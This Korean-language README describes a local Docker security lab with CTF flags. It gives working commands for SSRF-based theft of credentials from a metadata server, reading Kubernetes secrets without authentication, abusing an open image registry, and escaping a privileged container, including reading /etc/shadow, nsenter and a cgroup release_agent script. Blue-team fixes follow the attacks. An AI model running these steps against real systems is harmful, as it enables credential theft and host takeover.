# 클라우드/컨테이너 보안 랩 (04_cloud_container_lab)

이 랩은 클라우드 환경(AWS)과 컨테이너(Docker/Kubernetes)에서 발생하는
보안 취약점을 실습합니다. SSRF, IMDS 자격증명 탈취, K8s API 인증 취약점,
컨테이너 탈출 기법을 단계별로 학습합니다.

---

## 서비스 구성

| 서비스 | IP | 포트 | 설명 |
|--------|-----|------|------|
| ssrf-target | 172.18.0.50 | 8080 | SSRF 취약한 웹 앱 |
| metadata-server | 172.18.0.20 | 80 | AWS IMDS 시뮬레이터 |
| k8s-simulator | 172.18.0.10 | 8443 | 취약한 K8s API 서버 |
| vulnerable-registry | 172.18.0.30 | 5000 | 인증 없는 컨테이너 레지스트리 |
| privileged-container | 172.18.0.40 | — | 권한 과다 컨테이너 |
| attacker | 172.18.0.100 | — | 공격 도구 컨테이너 |

**외부 접근:**
- SSRF 앱: `http://localhost:8080`
- K8s API: `http://localhost:8443`
- 레지스트리: `http://localhost:5000`

---

## 빠른 시작

```bash
cd labs/04_cloud_container_lab
docker compose up -d

# 공격자 컨테이너 접속
docker exec -it cloud_lab_attacker bash
```

---

## 실습 시나리오 1: SSRF → IMDS → 자격증명 탈취

### 개요
웹 앱의 SSRF 취약점을 통해 AWS 메타데이터 서버에 접근하여
클라우드 IAM 자격증명을 탈취합니다.

### 단계 1: SSRF 취약점 발견

```bash
# 정상 요청 테스트
curl "http://localhost:8080/fetch?url=http://example.com"

# 내부 네트워크 스캔 (SSRF 활용)
curl "http://localhost:8080/fetch?url=http://172.18.0.1"
curl "http://localhost:8080/fetch?url=http://172.18.0.20"
```

### 단계 2: IMDS 접근 (SSRF 활용)

```bash
# 메타데이터 루트 접근
curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/"

# IAM 롤 이름 확인
curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/"

# 자격증명 탈취 (핵심)
curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/ec2-prod-role"
```

### 단계 3: 탈취한 자격증명으로 AWS 서비스 접근

```bash
# 환경변수 설정
export AWS_ACCESS_KEY_ID="FAKEKEYEXAMPLE000000"
export AWS_SECRET_ACCESS_KEY="FAKE_SECRET_KEY_FOR_CTF_LAB_DEMO_ONLY_000"
export AWS_SESSION_TOKEN="AQoDYXdzEJr...EXAMPLETOKEN"

# (실제 환경에서는 S3, EC2 등에 접근 가능)
aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

**플래그**: `FLAG{1mds_ssrf_cr3d3nt14l_th3ft}` (자격증명 응답에 포함)

---

## 실습 시나리오 2: K8s API 서버 취약점

### 개요
인증이 미흡한 Kubernetes API 서버에 접근하여
시크릿(Secret)을 열람하고 서비스 계정 토큰을 탈취합니다.

### 단계 1: API 서버 탐색 (인증 없이)

```bash
# 버전 정보 (익명 접근)
curl http://localhost:8443/version

# 네임스페이스 목록
curl http://localhost:8443/api/v1/namespaces

# 파드 목록
curl http://localhost:8443/api/v1/namespaces/default/pods
```

### 단계 2: 시크릿 열람

```bash
# 시크릿 목록
curl http://localhost:8443/api/v1/namespaces/default/secrets

# 특정 시크릿 내용 (base64 인코딩이지만 평문도 노출)
curl http://localhost:8443/api/v1/namespaces/default/secrets/db-credentials
curl http://localhost:8443/api/v1/namespaces/default/secrets/aws-credentials
curl http://localhost:8443/api/v1/namespaces/default/secrets/admin-token
```

### 단계 3: 서비스 계정 토큰 탈취

```bash
# 서비스 계정 토큰 요청
curl -X POST http://localhost:8443/api/v1/namespaces/default/serviceaccounts/default/token

# kubectl로 접근 (클라이언트 컨테이너에서)
# kubectl --server=http://172.18.0.10:8443 get secrets
```

**플래그**: `FLAG{k8s_4p1_s3rv3r_unauth_4cc3ss}`

---

## 실습 시나리오 3: 취약한 컨테이너 레지스트리

### 개요
인증이 없는 Docker 레지스트리에서 이미지를 열람하고
민감한 정보가 포함된 레이어를 분석합니다.

```bash
# 레지스트리 카탈로그 조회 (인증 없이) → corp-app, backup-tool 확인
curl http://localhost:5000/v2/_catalog

# 이미지 태그 목록
curl http://localhost:5000/v2/corp-app/tags/list
curl http://localhost:5000/v2/backup-tool/tags/list

# 이미지 매니페스트 (레이어 해시 포함)
curl http://localhost:5000/v2/corp-app/manifests/latest

# docker 명령으로 직접 pull
docker pull localhost:5000/corp-app:latest
docker pull localhost:5000/backup-tool:v1.2

# 이미지 레이어 분석 (삭제된 크리덴셜이 이전 레이어에 남아있음)
docker save localhost:5000/corp-app:latest | tar xv
# → layer/*.tar 파일을 열어 /etc/app.conf 탐색

# dive 도구로 레이어별 분석 (설치 필요: apt install dive)
dive localhost:5000/corp-app:latest
```

### 레지스트리에 악성 이미지 업로드

```bash
# 악성 이미지 태깅
docker tag ubuntu:22.04 localhost:5000/pwned-app:latest

# 인증 없이 push
docker push localhost:5000/pwned-app:latest

# 확인
curl http://localhost:5000/v2/_catalog
```

---

## 실습 시나리오 4: 컨테이너 탈출 (Privileged Mode)

### 개요
`--privileged` 플래그로 실행된 컨테이너에서 호스트 파일시스템에 접근하고
호스트로 탈출합니다.

### 접속

```bash
docker exec -it cloud_lab_privileged bash
```

### 단계 1: 권한 확인

```bash
# 컨테이너 내부에서
cat /proc/self/status | grep CapEff
# → 모든 권한이 활성화되어 있음을 확인

# 마운트된 디바이스 확인
fdisk -l
lsblk
```

### 단계 2: 호스트 파일시스템 접근

```bash
# 호스트 루트가 /host에 마운트되어 있음
ls /host
cat /host/etc/passwd
cat /host/etc/shadow

# 호스트의 플래그 파일
cat /host/tmp/container_escape_flag.txt
```

### 단계 3: 호스트 프로세스 접근

```bash
# 호스트 PID 네임스페이스 접근
nsenter --target 1 --mount --uts --ipc --net --pid
# → 호스트 쉘 획득
```

### 단계 4: cgroup 탈출 (고급)

```bash
# cgroup 탈출 기법
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

**플래그들**:
- `/flag.txt` 내부 플래그: `FLAG{c0nt41n3r_3sc4p3_pr1v1l3g3d}`
- 호스트 플래그: `FLAG{h0st_f1l3sy5t3m_4cc3ss}`

---

## 방어 관점 (Blue Team)

### SSRF 방어
```python
# 화이트리스트 기반 URL 검증
ALLOWED_DOMAINS = ["api.external-service.com"]
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_DOMAINS:
    raise ValueError("허용되지 않은 도메인")

# 내부 IP 범위 차단
import ipaddress
ip = ipaddress.ip_address(socket.gethostbyname(hostname))
if ip.is_private:
    raise ValueError("내부 IP 접근 불가")
```

### IMDSv2 강제 적용
```bash
# EC2 인스턴스에서 IMDSv2 강제 (토큰 필요)
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-endpoint enabled
```

### K8s RBAC 강화
```yaml
# 최소 권한 ServiceAccount
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
# secrets는 명시적으로 허용하지 않음
```

---

## 트러블슈팅

```bash
# 메타데이터 서버 직접 테스트
curl http://localhost:8080/hint

# K8s 시뮬레이터 확인
curl http://localhost:8443/version

# 레지스트리 상태 확인
curl http://localhost:5000/v2/

# privileged 컨테이너 확인
docker inspect cloud_lab_privileged | grep -i privileged
```
